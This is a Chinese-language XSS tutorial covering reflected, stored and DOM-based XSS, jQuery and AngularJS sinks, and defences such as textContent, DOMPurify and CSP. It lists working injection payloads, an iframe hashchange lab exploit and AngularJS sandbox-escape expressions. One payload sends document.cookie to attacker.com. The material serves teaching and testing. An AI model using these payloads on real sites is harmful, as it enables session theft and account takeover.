# Cross-Site Scripting (XSS)

> **参考：** [CSRF](../Cross-site%20request%20forgery%20(CSRF)/Cross-site%20request%20forgery%20(CSRF).md) | [JavaScript for XSS](./JavaScript%20for%20XSS/JavaScript%20for%20XSS.md) | [DOM and Browser](./DOM%20and%20Browser/DOM%20and%20Browser.md) | [XSS Payloads](./XSS%20Payloads/XSS%20Payloads.md) | [Content Security Policy](./Content%20Security%20Policy/Content%20Security%20Policy.md) | [XSS Prevention](./XSS%20Prevention/XSS%20Prevention.md)

---

## 什么是 XSS？

跨站脚本（Cross-Site Scripting，简称 XSS）是一种 Web 安全漏洞，允许攻击者破坏用户与存在漏洞的应用程序之间的交互。它使攻击者能够绕过同源策略（Same Origin Policy），该策略旨在将不同网站彼此隔离。XSS 漏洞通常允许攻击者伪装成受害用户，执行该用户能够执行的任何操作，并访问该用户的任何数据。如果受害用户在应用程序中具有特权访问权限，攻击者可能能够完全控制应用程序的所有功能和数据。

> **Same Origin Policy 回顾：** "源"由**协议（Protocol）**、**域名（Host）**和**端口（Port）**三部分组成。只有当这三者完全一致时，才叫同源。XSS 攻击的核心在于：攻击者将恶意脚本注入到可信网站的页面中，使得浏览器认为该脚本来自可信源，从而绕过同源策略的限制。

### XSS 的工作原理

XSS 通过操纵存在漏洞的网站，使其向用户返回恶意 JavaScript 来工作。当恶意代码在受害者浏览器中执行时，攻击者可以完全破坏其与应用程序的交互。

核心流程：

1. 攻击者发现应用程序中存在一个注入点，允许将恶意数据嵌入响应中
2. 攻击者构造包含恶意 JavaScript 的 payload
3. 受害者访问包含 payload 的页面（直接访问恶意 URL，或访问存储了恶意内容的页面）
4. 浏览器解析响应，执行注入的 JavaScript
5. 恶意脚本在受害者的会话上下文中运行，可以读取数据、发出请求、修改页面

### XSS 概念验证（Proof of Concept）

确认大多数类型的 XSS 漏洞，可以通过注入一个 payload 使浏览器执行任意 JavaScript。长期以来，`alert()` 函数一直用于此目的，因为它简短、无害且成功调用时非常明显。

**Chrome 的限制：** 从 Chrome 92 版本（2021 年 7 月 20 日）开始，跨源 iframe 被阻止调用 `alert()`。由于跨源 iframe 用于构造一些更高级的 XSS 攻击，有时需要使用替代 PoC payload。在这种场景下，推荐使用 `print()` 函数。

### XSS 攻击的三种类型

| 类型 | 恶意脚本来源 | 数据存储位置 | 触发方式 |
|------|------------|------------|---------|
| **反射型 XSS** (Reflected XSS) | 当前 HTTP 请求 | 不存储，在响应中即时反射 | 受害者点击恶意链接 |
| **存储型 XSS** (Stored XSS) | 网站数据库 | 服务器端（数据库、文件系统等） | 受害者访问包含恶意内容的正常页面 |
| **DOM 型 XSS** (DOM-based XSS) | 客户端代码而非服务器端代码 | 不经过服务器，仅存在于客户端 | JavaScript 不安全地处理用户可控数据并写入 DOM |

---

## 反射型 XSS

### 什么是反射型 XSS？

反射型 XSS（Reflected Cross-Site Scripting）是最简单的跨站脚本类型。当应用程序接收 HTTP 请求中的数据，并以不安全的方式将该数据包含在即时响应中时，就会出现此漏洞。

假设一个网站有一个搜索功能，通过 URL 参数接收用户提供的搜索词：

```
https://insecure-website.com/search?term=gift
```

应用程序将提供的搜索词回显在响应中：

```html
<p>You searched for: gift</p>
```

假设应用程序不对数据执行任何其他处理，攻击者可以构造如下攻击：

```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

此 URL 产生以下响应：

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

如果应用程序的另一用户请求攻击者的 URL，则攻击者提供的脚本将在受害用户浏览器中执行，在其与应用程序的会话上下文中运行。

### 反射型 XSS 攻击的影响

如果攻击者能够控制在受害者浏览器中执行的脚本，通常可以完全攻陷该用户。攻击者可以：

- 执行用户能够在应用程序中执行的任何操作
- 查看用户能够查看的任何信息
- 修改用户能够修改的任何信息
- 发起与其他应用程序用户的交互，包括恶意攻击，这些攻击看似来自最初的受害用户

攻击者诱导受害者发出其控制的请求的方式包括：

- 在攻击者控制的网站上放置链接
- 在允许生成内容的其他网站上放置链接
- 通过电子邮件、推文或其他消息发送链接

攻击可以针对已知用户进行定向攻击，也可以是对应用程序任意用户的无差别攻击。由于需要外部交付机制，反射型 XSS 的影响通常比存储型 XSS 小。

### 如何查找和测试反射型 XSS 漏洞

手动测试反射型 XSS 漏洞的步骤：

| 步骤 | 操作 | 说明 |
|------|------|------|
| **1. 测试每个入口点** | 分别测试应用程序 HTTP 请求中的每个数据入口点 | 包括 URL 查询字符串和消息体中的参数或数据、URL 文件路径，以及 HTTP 头（通过某些 HTTP 头触发的 XSS 行为在实践中可能无法利用） |
| **2. 提交随机字母数字值** | 为每个入口点提交唯一的随机值，确定该值是否在响应中被反射 | 值应足够短且仅包含字母数字字符，以通过大多数输入验证。约 8 个字符的随机字母数字值通常是最理想的 |
| **3. 确定反射上下文** | 对于响应中反射随机值的每个位置，确定其上下文 | 可能是 HTML 标签之间的文本、带引号的标签属性内、JavaScript 字符串内等 |
| **4. 测试候选 payload** | 基于反射上下文，测试初始候选 XSS payload | 如果 payload 在响应中原样反射，将触发 JavaScript 执行 |
| **5. 测试替代 payload** | 如果候选 payload 被修改或阻止，测试替代 payload 和技术 | 基于反射上下文和正在执行的输入验证类型 |
| **6. 在浏览器中测试攻击** | 如果找到在工具中似乎有效的 payload，在真实浏览器中验证 | 执行 `alert(document.domain)` 来确认攻击成功 |

---

## 存储型 XSS

### 什么是存储型 XSS？

存储型 XSS（Stored XSS，也称为持久型或二阶 XSS）发生在应用程序接收来自不受信任源的数据，并以不安全的方式将该数据包含在后续 HTTP 响应中时。

假设一个网站允许用户在博客文章上提交评论，评论会显示给其他用户。用户使用如下 HTTP 请求提交评论：

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

提交此评论后，任何访问该博客文章的用户将在应用程序的响应中收到：

```html
<p>This post was extremely helpful.</p>
```

假设应用程序不对数据执行任何其他处理，攻击者可以提交如下恶意评论：

```html
<script>/* Bad stuff here... */</script>
```

在攻击者的请求中，此评论将被 URL 编码为：

```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

任何访问该博客文章的用户现在将收到：

```html
<p><script>/* Bad stuff here... */</script></p>
```

攻击者提供的脚本将在受害用户浏览器中执行，在其与应用程序的会话上下文中运行。

### 存储型 XSS 攻击的影响

存储型 XSS 与反射型 XSS 在可利用性方面的关键区别在于：**存储型 XSS 漏洞使攻击能够在应用程序内部自包含**。攻击者不需要找到外部方式来诱导其他用户发出包含其攻击 payload 的特定请求。相反，攻击者将其攻击 payload 放入应用程序本身，只需等待用户遇到它。

存储型 XSS 的自包含特性在以下场景中尤为重要：XSS 漏洞仅影响当前登录应用程序的用户。如果 XSS 是反射型的，攻击必须是机会性的——用户在未登录时被诱导发出攻击者请求将不会受到威胁。而如果 XSS 是存储型的，用户遇到攻击 payload 时**保证已登录**。

### 如何查找和测试存储型 XSS 漏洞

测试存储型 XSS 漏洞的关键是定位**入口点**和**出口点**之间的链接：

**入口点**（数据进入应用程序处理的位置）：

- URL 查询字符串和消息体中的参数或数据
- URL 文件路径
- HTTP 请求头（可能无法通过反射型 XSS 利用）
- 任何带外路径：Webmail 应用程序处理邮件中的数据；Twitter 源应用程序处理第三方推文中的数据；新闻聚合器包含来自其他网站的数据

**出口点**（数据可能出现在应用程序响应中的位置）：

- 在**任何情况下**返回给**任何类型**应用程序用户的**所有可能的 HTTP 响应**

**实践方法：** 系统性地遍历数据入口点，向每个入口点提交特定值，并监控应用程序的响应以检测提交值出现的位置。特别注意相关的应用程序功能，如博客文章评论。当在响应中观察到提交值时，需要确定数据是否确实跨不同请求存储，而不是在即时响应中被简单反射。

测试方法与反射型 XSS 基本相同：确定存储数据出现的响应上下文，测试适用于该上下文的候选 XSS payload。

### 反射型 XSS 与存储型 XSS 对比

| 维度 | 反射型 XSS | 存储型 XSS |
|------|----------|----------|
| **触发方式** | 受害者点击恶意链接 | 受害者访问正常页面即可触发 |
| **持久性** | 不持久，仅存在于单次请求-响应中 | 数据存储在服务器端，持续影响所有访问者 |
| **攻击范围** | 一对一的定向攻击或一对多的钓鱼攻击 | 一对多，自动影响所有访问受影响页面的用户 |
| **利用难度** | 需要社会工程学交付恶意 URL | 只需将 payload 提交到应用程序即可 |
| **严重性** | 通常较低（需要受害者主动操作） | 通常较高（自包含，无需外部交付机制） |

---

## DOM 型 XSS

### 什么是 DOM 型 XSS？

DOM 型 XSS（DOM-based Cross-Site Scripting）发生在应用程序包含一些客户端 JavaScript，以不安全的方式处理来自不受信任源的数据时，通常是将数据写回 DOM。

在以下示例中，应用程序使用 JavaScript 从输入字段读取值并将其写入 HTML 元素：

```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

如果攻击者能够控制输入字段的值，可以轻松构造恶意值使其脚本执行：

```html
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

在典型情况下，输入字段将从 HTTP 请求的一部分（如 URL 查询字符串参数）填充，允许攻击者使用恶意 URL 交付攻击，方式与反射型 XSS 相同。

### DOM XSS 的核心概念：Sources 与 Sinks

要交付 DOM 型 XSS 攻击，需要将数据放入 **source（源）**，使其传播到 **sink（汇）** 并导致任意 JavaScript 的执行。

**最常用的 source 是 URL**，通常通过 `window.location` 对象访问。攻击者可以构造一个链接，将 payload 放入 URL 的查询字符串和片段部分，发送受害者到存在漏洞的页面。在某些情况下（如针对 404 页面或运行 PHP 的网站），payload 也可以放在路径中。

#### 理解 Source 与 Sink：水管比喻

抛开代码，用"水管"的比喻来理解：

**水源（Source）= 水龙头。** 这是水流进你家的入口。如果坏人往水龙头里倒毒药，水一打开，毒药就进来了。技术上，Source 是攻击者能够控制的、数据进入浏览器页面的入口。最常见的 Source 是浏览器地址栏里的 URL（`location.search`、`location.hash` 等）。

**水龙头出水口（Sink）= 你喝水的杯子。** 这是水最终"执行"动作的地方——被"喝掉"或"使用"的地方。技术上，Sink 是数据最终被写进网页 HTML 或执行 JavaScript 的那个危险函数或位置，如 `document.write()`、`innerHTML`、`eval()` 等。

**DOM XSS 的原理：** 坏人把恶意代码（毒药）从 Source（入口）塞进去，然后这个代码顺着管道流到了 Sink（执行点），最后被浏览器"喝"下去并执行了。

**具体例子：** `eval(location.hash)` —— `location.hash` 是 Source（攻击者可以构造 `#` 后面的内容），`eval()` 是 Sink（把字符串当成代码执行）。

**攻击过程示例：**

```javascript
// 从 URL 获取参数 name —— 这是 Source
var name = location.search.substring(1);

// 直接把 name 写到页面里 —— 这是 Sink
document.write("欢迎您：" + name);
```

攻击者构造链接 `https://example.com/page?name=<script>alert(1)</script>`，数据从 Source（URL）流入 Sink（`document.write`），浏览器将字符串解析为真正的 `<script>` 标签并执行。

**关键结论：** 只要攻击者能控制的数据（Source）未经消毒就跑到了危险的执行点（Sink），DOM XSS 就诞生了。

### 测试 HTML Sinks

对于 HTML sink 中的 DOM XSS：

1. 将随机字母数字字符串放入 source（如 `location.search`）
2. 使用开发者工具检查 HTML，找到字符串出现的位置（注意：浏览器的"查看源代码"选项不适用于 DOM XSS 测试，因为它不考虑 JavaScript 对 HTML 的修改）
3. 对于字符串在 DOM 中出现的每个位置，确定上下文
4. 基于上下文，细化输入以查看其处理方式（如字符串出现在双引号属性中，尝试注入双引号以查看是否能脱离属性）

**浏览器差异：** Chrome、Firefox 和 Safari 会 URL 编码 `location.search` 和 `location.hash`，而 IE11 和 Microsoft Edge（Chromium 之前）不会对这些 source 进行 URL 编码。如果数据在 processing 之前被 URL 编码，XSS 攻击不太可能成功。

### 测试 JavaScript 执行 Sinks

1. 对于每个潜在 source，首先在页面 JavaScript 代码中查找 source 被引用的位置（Chrome DevTools 中可使用 Control+Shift+F 搜索所有 JavaScript 代码）
2. 使用 JavaScript 调试器添加断点，追踪 source 的值如何被使用
3. source 可能被赋值给其他变量，需要继续追踪这些变量
4. 当找到接收源自 source 的数据的 sink 时，使用调试器检查值
5. 细化输入以查看是否能够交付成功的 XSS 攻击

### 不同 Source 和 Sink 的利用

#### document.write Sink

`document.write` sink 可用于注入 `<script>` 元素：

```javascript
document.write('... <script>alert(document.domain)</script> ...');
```

注意：在某些情况下，写入 `document.write` 的内容包含周围上下文，需要在利用中予以处理（如先闭合一些现有元素）。

#### innerHTML Sink

`innerHTML` sink 在任何现代浏览器上**不接受 `script` 元素**，`svg onload` 事件也不会触发。需要使用替代元素如 `img` 或 `iframe`，配合 `onload` 和 `onerror` 等事件处理器。

##### 漏洞代码解析

以下通过一段完整的 DOM XSS 漏洞代码进行逐行分析：

```javascript
// 定义函数：接收 query 参数，插入到页面
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}

// 从 URL 中获取 search 参数
var query = (new URLSearchParams(window.location.search)).get('search');

// 如果 search 参数存在，执行函数
if(query) {
    doSearchQuery(query);
}
```

##### 数据流追踪

```
Source（源）                    Sink（汇）
     |                              |
location.search  -->  query  -->  innerHTML
     |                              |
用户可控                        危险操作
```

攻击者通过 URL 参数 `?search=...` 控制数据，数据流经 `query` 变量，最终被传入 `innerHTML`。`innerHTML` 将字符串解析为 HTML 并插入 DOM，如果字符串中包含恶意标签，浏览器会解析这些标签并触发相应的事件处理器。

##### 为什么 `<script>` 不执行？

浏览器对动态插入的 `<script>` 标签有特殊的安全限制：

| 插入方式 | `<script>` 是否执行 | 原因 |
|---------|-------------------|------|
| 静态 HTML（页面源代码） | 执行 | 页面加载时 HTML 解析器会执行遇到的 script 标签 |
| `document.write()` | 执行 | 同步写入，仍在 HTML 解析阶段 |
| `innerHTML` | 不执行 | 动态插入，HTML5 规范明确要求不执行 |
| `outerHTML` | 不执行 | 同上 |
| `insertAdjacentHTML()` | 不执行 | 同上 |

**核心原则：** 浏览器为了防止 XSS，通过 `innerHTML` 等 DOM API 动态插入的 `<script>` 标签不会被执行。这是 HTML5 规范中明确规定的安全机制。

##### 正确的利用方式

由于 `<script>` 标签被阻止，攻击者转而使用**不需要 `<script>` 标签**的事件驱动型 payload。以下按推荐程度排列：

**方式 1：`<img>` + `onerror`（最常用）**

```html
<img src='0' onerror='alert(1)'>
```

原理：`src='0'` 导致图片加载失败，触发 `onerror` 事件，执行 JavaScript。这是最广泛使用的 payload，因为 `<img>` 标签几乎不会被任何输入过滤器拦截。

**方式 2：`<svg>` + `onload`**

```html
<svg onload='alert(1)'>
```

原理：SVG 元素加载完成时触发 `onload` 事件。SVG 是一个完整的 XML 文档，`onload` 会在 SVG 渲染完成后自动触发。

**方式 3：`<body>` + `onload`**

```html
<body onload='alert(1)'>
```

原理：body 元素加载完成时触发。注意：如果页面已经有 `<body>` 标签，此 payload 可能会破坏页面结构。

**方式 4：`<iframe>` + `onload`**

```html
<iframe onload='alert(1)'>
```

原理：iframe 加载完成（即使是空白页）时触发 `onload`。

**方式 5：`<input>` + `onfocus` + `autofocus`**

```html
<input onfocus='alert(1)' autofocus>
```

原理：`autofocus` 属性让输入框在渲染后自动获得焦点，触发 `onfocus` 事件。无需用户交互即可自动执行。

**方式 6：`<details>` + `ontoggle`**

```html
<details ontoggle='alert(1)' open>
```

原理：`open` 属性让 `<details>` 元素默认展开，触发 `ontoggle` 事件。较新的技术，部分老旧浏览器不支持。

**方式 7：`<a>` + `onmouseover`（需要用户交互）**

```html
<a href='#' onmouseover='alert(1)'>悬停触发</a>
```

原理：用户鼠标悬停在链接上时触发。缺点是需要用户交互，不如自动触发的方式可靠。

##### 实战 Payload 对比

| Payload | 是否执行 | 原因 |
|---------|---------|------|
| `<script>alert(1)</script>` | 否 | `innerHTML` 安全机制阻止 script 执行 |
| `<img src=x onerror=alert(1)>` | 是 | 图片资源加载失败触发 onerror 事件 |
| `<svg onload=alert(1)>` | 是 | SVG 加载完成触发 onload 事件 |
| `<body onload=alert(1)>` | 是 | body 加载完成触发 onload 事件 |
| `<input onfocus=alert(1) autofocus>` | 是 | autofocus 自动聚焦触发 onfocus 事件 |
| `<details ontoggle=alert(1) open>` | 是 | open 属性使元素展开触发 ontoggle 事件 |
| `<a href=javascript:alert(1)>` | 否（需点击） | `javascript:` 伪协议需要用户点击才执行 |

##### 完整攻击流程演示

**步骤 1：正常访问**

```
https://example.com/?search=hello
```

页面显示：`hello`（正常行为，用户输入被显示在页面上）

**步骤 2：尝试 `<script>` 注入（失败）**

```
https://example.com/?search=<script>alert(1)</script>
```

页面显示：`<script>alert(1)</script>`（作为纯文本显示，不执行）

原因：`innerHTML` 虽然会解析 HTML 标签，但 HTML5 规范要求浏览器不执行动态插入的 `<script>` 元素。

**步骤 3：使用事件驱动 payload（成功）**

```
https://example.com/?search=<img src=0 onerror=alert(1)>
```

- 页面显示：空白或裂图图标（图片 `0` 加载失败）
- 弹窗：`alert(1)` 执行成功

##### 浏览器 DevTools 验证

在实际测试中，可以通过浏览器开发者工具观察攻击效果：

**1. 查看修改后的 DOM：** `F12 -> Elements` 标签，可以看到：

```html
<span id="searchMessage">
    <img src="0" onerror="alert(1)">
</span>
```

**2. 查看网络请求：** `F12 -> Network` 标签，可以看到浏览器尝试加载 `0` 这个不存在的图片资源（返回 404）。

**3. 查看控制台输出：** `F12 -> Console` 标签，可能看到类似 `GET http://example.com/0 404 (Not Found)` 的错误信息。

##### innerHTML 的防御方案

**方案 1：使用 `textContent` 替代 `innerHTML`（最推荐）**

```javascript
// 不安全 —— 会解析 HTML
document.getElementById('searchMessage').innerHTML = query;

// 安全 —— 所有内容作为纯文本处理
document.getElementById('searchMessage').textContent = query;
```

`textContent` 将所有输入视为纯文本，不会解析任何 HTML 标签。这是最简单、最安全的方案，适用于只需要显示文本的场景。

**方案 2：HTML 编码（需要保留部分 HTML 时）**

```javascript
function escapeHTML(str) {
    return str.replace(/[&<>"]/g, function(match) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;'
        };
        return map[match];
    });
}

document.getElementById('searchMessage').innerHTML = escapeHTML(query);
```

将 HTML 特殊字符编码为对应的实体，使其无法被解析为标签。注意：单引号在大多数 HTML 上下文中不需要转义，但如果数据被放入单引号属性值中则需要。

**方案 3：使用 DOMPurify（需要保留富文本时）**

```javascript
// 引入 DOMPurify 库后
document.getElementById('searchMessage').innerHTML = DOMPurify.sanitize(query);
```

DOMPurify 会解析 HTML 并移除所有危险标签和属性，只保留安全的内容。适合需要允许用户提交富文本（如加粗、斜体）的场景。需要定期更新库版本以应对新发现的绕过技术。

**方案 4：CSP（内容安全策略，作为最后防线）**

```
Content-Security-Policy: default-src 'self'; img-src 'self'
```

通过 CSP 限制页面可以加载的资源来源，即使 XSS 注入成功，攻击者的恶意请求（如向外部服务器发送数据）也会被浏览器阻止。

##### innerHTML 漏洞核心总结

| 维度 | 要点 |
|------|------|
| innerHTML 的坑 | 不执行 `<script>`，但会执行事件属性（onerror、onload 等），且会加载外部资源（img、iframe 等） |
| 攻击者思路 | 找到 Source（URL 参数） -> 追踪到 Sink（innerHTML） -> 无法用 `<script>`，换用事件驱动 payload |
| 防御思路 | 优先使用 `textContent`；如需 HTML，使用 DOMPurify 过滤；配合 CSP 限制资源加载 |

### jQuery 中的 DOM XSS

如果使用了 jQuery 等 JavaScript 库，需要注意可以改变页面上 DOM 元素的 sink。

#### attr() 函数

如果数据从用户可控的 source（如 URL）读取并传递给 `attr()` 函数，可能可以操纵发送的值导致 XSS。以下通过一段典型的存在漏洞代码进行逐行解析：

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

##### 代码逐行解析

**第 1 行：`$(function() { ... })`**

jQuery 的文档就绪函数（document ready）。当页面的 DOM 结构完全加载完成后，才执行里面的代码。等价于原生 JavaScript 的 `document.addEventListener('DOMContentLoaded', function() { ... })`。目的是确保页面上的元素（如 `#backLink`）已经存在，避免操作不存在的元素导致报错。

**第 2 行：`$('#backLink')`**

使用 jQuery 选择器，找到页面上 ID 为 `backLink` 的元素。预期对应的 HTML 类似：

```html
<a id="backLink">返回上一页</a>
```

**第 2 行（继续）：`.attr("href", ...)`**

jQuery 的 `attr()` 方法，用于设置 HTML 属性的值。语法为 `.attr(属性名, 属性值)`。此处将 `#backLink` 元素的 `href` 属性设置为从 URL 参数中获取的值。

**第 2 行（继续）：`(new URLSearchParams(window.location.search)).get('returnPath')`**

这是最核心的部分，拆解为三步：

| 步骤 | 代码 | 说明 |
|------|------|------|
| A | `window.location.search` | 获取当前 URL 中问号 `?` 后面的查询字符串部分。例如 URL 为 `https://example.com/page?returnPath=/dashboard`，则返回 `?returnPath=/dashboard` |
| B | `new URLSearchParams(...)` | 创建 `URLSearchParams` 对象，用于解析查询字符串。将 `?returnPath=/dashboard` 解析为键值对 `{ returnPath: '/dashboard' }` |
| C | `.get('returnPath')` | 从解析结果中取出名为 `returnPath` 的参数值。结果为 `/dashboard` |

整体组合效果：从当前 URL 的查询参数中取出 `returnPath` 的值。

##### 完整功能说明

页面加载完成后，从 URL 中读取 `returnPath` 参数，将其值设置给 `#backLink` 链接的 `href` 属性。

实际效果示例 —— 用户访问：

```
https://example.com/page?returnPath=/user/profile
```

页面上的"返回"链接变为：

```html
<a id="backLink" href="/user/profile">返回上一页</a>
```

用户点击后跳转到 `/user/profile`。

##### 安全漏洞分析

**漏洞类型：** DOM-based XSS（通过 `javascript:` 伪协议）

**攻击场景：** 攻击者构造恶意 URL：

```
https://example.com/page?returnPath=javascript:alert(document.cookie)
```

**执行过程：**

1. 用户访问恶意链接
2. 页面加载，`URLSearchParams` 取出 `returnPath` 的值：`javascript:alert(document.cookie)`
3. 设置 `#backLink` 的 `href` 属性为 `javascript:alert(document.cookie)`
4. 页面显示"返回上一页"链接
5. 用户点击链接时，执行 JavaScript 代码

**对比示例：**

| 场景 | URL 参数 | 渲染结果 | 点击后果 |
|------|---------|---------|---------|
| 正常 | `?returnPath=/home` | `<a href="/home">返回</a>` | 跳转到 `/home`（正常） |
| 攻击 | `?returnPath=javascript:alert(document.cookie)` | `<a href="javascript:alert(document.cookie)">返回</a>` | 弹窗显示 cookie（XSS） |
| 更危险 | `?returnPath=javascript:window.location='//attacker.com/steal?c='+document.cookie` | `<a href="javascript:...">返回</a>` | Cookie 被发送到攻击者服务器 |

##### 为什么这个漏洞容易被忽略？

1. **`href` 属性不总是执行 JavaScript：** 普通的 `href="https://example.com"` 是安全的导航链接，但 `href="javascript:..."` 使用 `javascript:` 伪协议，点击时会执行其中的代码
2. **开发者可能只过滤了 `<script>` 标签：** 输入 `javascript:alert(1)` 不包含任何 HTML 标签，基于标签黑名单的过滤完全无效
3. **`URLSearchParams` 不做任何安全处理：** 它只是忠实地解析查询字符串，不会对值进行编码或过滤

##### 其他类似攻击向量

| 向量 | 示例 |
|------|------|
| `javascript:` 伪协议 | `?returnPath=javascript:alert(1)` |
| `data:` 协议 | `?returnPath=data:text/html,<script>alert(1)</script>` |
| `vbscript:` 协议（旧版 IE） | `?returnPath=vbscript:alert(1)` |
| 换行绕过 | `?returnPath=javascript:%0aalert(1)`（`%0a` 为换行符，可绕过某些对 `javascript:` 前缀的检测） |

#### $() 选择器函数

jQuery 的 `$()` 选择器函数可能被用于向 DOM 注入恶意对象。经典的 DOM XSS 漏洞是由网站将此选择器与 `location.hash` source 结合使用，用于动画或自动滚动到页面上的特定元素。

##### 靶场案例：DOM XSS in jQuery selector sink using a hashchange event

**漏洞类型：** DOM 型 XSS，攻击的全部逻辑发生在受害者浏览器中，与服务器无关。

**漏洞代码（PortSwigger 靶场实际代码）：**

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains("' + decodeURIComponent(window.location.hash.slice(1)) + '")');
    if (post.get(0)) {
        post.get(0).scrollIntoView();
    }
});
```

**代码功能：** 监听 URL hash 变化，从中提取文章标题，通过 jQuery 选择器 `:contains()` 查找对应标题的 `<h2>` 元素，滚动到该文章位置。

**Source 与 Sink 分析：**

| 角色 | 内容 | 说明 |
|------|------|------|
| Source | `window.location.hash` | URL 中 `#` 及其后面的部分，攻击者完全可控 |
| Sink | `$()` 选择器函数 | 传入含 HTML 标签的字符串时会尝试创建 HTML 元素（旧版 jQuery） |
| 触发条件 | `hashchange` 事件 | 仅在 hash 值**发生变化**时触发，页面初始加载不触发 |

**为什么第一次访问带 `#` 的 URL 不会触发漏洞？**

`hashchange` 事件仅在 hash 值发生变化时触发。直接访问 `https://example.com/#payload` 时，hash 的初始值就是 `#payload`，没有"变化"过程，事件不会触发。必须先加载一个不同 hash（或无 hash）的页面，然后改变 hash，才能触发事件。这是此靶场与之前直接通过 `location.search` 触发的反射型 XSS 靶场的核心区别。

**Payload 构造原理：**

攻击者构造 hash：`#")<img src=x onerror=print()>`

正常输入与恶意输入的拼接对比：

```
正常输入（welcome-post）：
  拼接结果：$('section.blog-list h2:contains("welcome-post")')
  效果：正常的选择器，查找包含 "welcome-post" 的 h2 元素

恶意输入（")<img src=x onerror=print()>）：
  拼接结果：$('section.blog-list h2:contains("")<img src=x onerror=print()>")')
```

jQuery 解析恶意拼接结果的过程：

1. `:contains("")` -- 输入中的 `"` 提前闭合了 `:contains()` 的引号，`"")` 表示匹配空字符串（匹配所有 h2）
2. `<img src=x onerror=print()>` -- `:contains()` 已被 `)` 闭合，后续的 `<img>` 被 jQuery 识别为 HTML 标签并创建元素
3. 图片加载 `src=x` 失败（无效路径），触发 `onerror` 事件，执行 `print()`

**为什么不用 `<script>` 标签？**

jQuery 的 `$()` 动态创建 HTML 元素时，与 `innerHTML` 有相同的安全限制：HTML5 规范要求浏览器不执行通过 DOM API 动态插入的 `<script>` 标签。因此必须使用事件驱动型标签（`<img onerror>`、`<svg onload>` 等）。

**攻击交付：iframe 触发 hashchange**

由于受害者不会主动修改 URL hash，攻击者使用 iframe 自动完成"先设置初始 hash，再改变 hash"的两步操作：

```html
<iframe src="https://lab-id.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

执行流程：

| 步骤 | 操作 | hash 值 | hashchange |
|------|------|---------|------------|
| 1 | iframe 加载目标页面 | `#`（空 hash） | 不触发（初始加载） |
| 2 | `onload` 触发，执行 `this.src += payload` | `#<img src=x onerror=print()>` | 触发（hash 从空变为恶意值） |
| 3 | 漏洞代码执行，jQuery 解析 hash 并创建 `<img>` 元素 | -- | -- |
| 4 | 图片加载失败（`src=x` 无效），`onerror` 触发 `print()` | -- | 攻击成功 |

**关键总结：**

- Source（`location.hash`）用户可控，Sink（`$()` 选择器）在旧版 jQuery 中可解析并创建 HTML 元素
- `hashchange` 只在 hash 发生变化时触发，初始加载不触发 -- 这是此靶场与普通反射型 XSS 的核心区别
- 动态创建的 `<script>` 标签不执行（与 `innerHTML` 相同的 HTML5 安全机制），需用事件驱动型 payload（`<img onerror>`）
- iframe + `onload` 修改 `src` 的技巧实现了"先设初始值，再改变"的两步操作，自动触发 `hashchange`，无需受害者交互

---

更新版本的 jQuery 已修补此特定漏洞，阻止在以 `#` 开头时将 HTML 注入选择器。但即使是较新版本的 jQuery，如果完全控制其来自不需要 `#` 前缀的 source 的输入，仍可能通过 `$()` 选择器 sink 存在漏洞。

### AngularJS 中的 DOM XSS

如果使用了 AngularJS 等框架，可能无需尖括号或事件即可执行 JavaScript。当站点在 HTML 元素上使用 `ng-app` 属性时，AngularJS 将处理该元素及其子元素，扫描 DOM 中的 `{{ }}` 双大括号表达式并执行其中的 JavaScript 代码。

#### AngularJS 表达式注入原理

AngularJS 的 `{{ }}` 表达式会被框架解析并作为 JavaScript 执行。例如：

```html
<div ng-app="">
    <p>{{ 1 + 1 }}</p>       <!-- 显示: 2 -->
    <p>{{ 7 * 7 }}</p>       <!-- 显示: 49 -->
</div>
```

如果用户可控的数据（如 URL 参数）被回显到 `ng-app` 作用域内的页面中，攻击者可以在数据中嵌入 `{{ }}` 表达式，AngularJS 会解析并执行它。**关键优势：不需要尖括号 `<` `>` 和引号 `"`，因此传统的 HTML 编码防御对此类攻击无效。**

#### AngularJS 沙箱（Sandbox）

AngularJS 1.0 到 1.5 版本实现了一个表达式沙箱，旨在阻止表达式中的代码访问全局对象（如 `window`、`document`、`alert`）。在沙箱保护下：

| Payload | 是否执行 | 原因 |
|---------|---------|------|
| `{{alert(1)}}` | 否 | `alert` 不在 AngularJS 表达式的作用域中，被沙箱拦截 |
| `{{window.alert(1)}}` | 否 | `window` 不可访问 |
| `{{document.cookie}}` | 否 | `document` 不可访问 |

> **注意：** AngularJS 1.6 移除了沙箱，因为开发团队承认沙箱无法提供真正的安全保障，存在大量绕过技术。移除沙箱后，`{{alert(1)}}` 等直接调用将正常工作。

#### 沙箱逃逸技术

沙箱可以被绕过，核心思路是：**通过 AngularJS 作用域中可访问的内置对象，间接获取 JavaScript 的 `Function` 构造函数，从而执行任意代码。**

**方式一：通过 `$on` 等 Scope 方法**

AngularJS scope 上的方法（如 `$on`、`$watch`、`$apply`）本身是函数，它们的 `constructor` 属性直接指向 `Function`：

```
{{$on.constructor('alert(1)')()}}
```

执行过程：
1. `$on` -- AngularJS scope 上的事件监听方法，在沙箱白名单中可访问
2. `$on.constructor` -- 返回 `Function` 构造函数（`$on` 是函数，其 constructor 即为 Function）
3. `$on.constructor('alert(1)')` -- 调用 `Function('alert(1)')`，创建新函数：`function() { alert(1) }`
4. `()` -- 执行这个新创建的函数，`alert(1)` 被调用

**方式二：通过数组或字符串的 `constructor.constructor`**

当起始对象不是函数时，需要两次 `.constructor` 才能拿到 `Function`：

```
{{[].constructor.constructor('alert(1)')()}}
```

执行过程：
1. `[]` -- 空数组，在沙箱中可访问
2. `[].constructor` -- 返回 `Array` 构造函数
